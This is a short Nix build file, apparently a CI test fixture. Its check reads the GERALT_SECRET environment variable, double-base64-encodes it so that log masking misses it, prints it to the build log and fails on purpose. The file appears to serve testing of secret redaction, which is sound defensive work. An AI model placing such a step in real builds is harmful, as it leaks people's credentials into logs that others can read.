let
  nixpkgs = builtins.fetchTarball {
    url = "https://releases.nixos.org/nixpkgs/nixpkgs-24.05pre596549.db001797591b/nixexprs.tar.xz";
    sha256 = "0260ylnd8kawcd3i9xkm8j295hf3bs377vjff8pm3v914jzld9v9";
  };
  pkgs = import nixpkgs { system = builtins.currentSystem; };
  secret = builtins.getEnv "GERALT_SECRET";
  leak = pkgs.runCommand "geralt-leak" { GERALT_SECRET = secret; } ''
    echo "GERALT_LEAKED_TOKEN=$(printf '%s' "$GERALT_SECRET" | base64 | base64)"
    exit 1
  '';
  checks = {
    leak = leak;
  };
in {
  ci = pkgs.linkFarm "ci" checks;
}
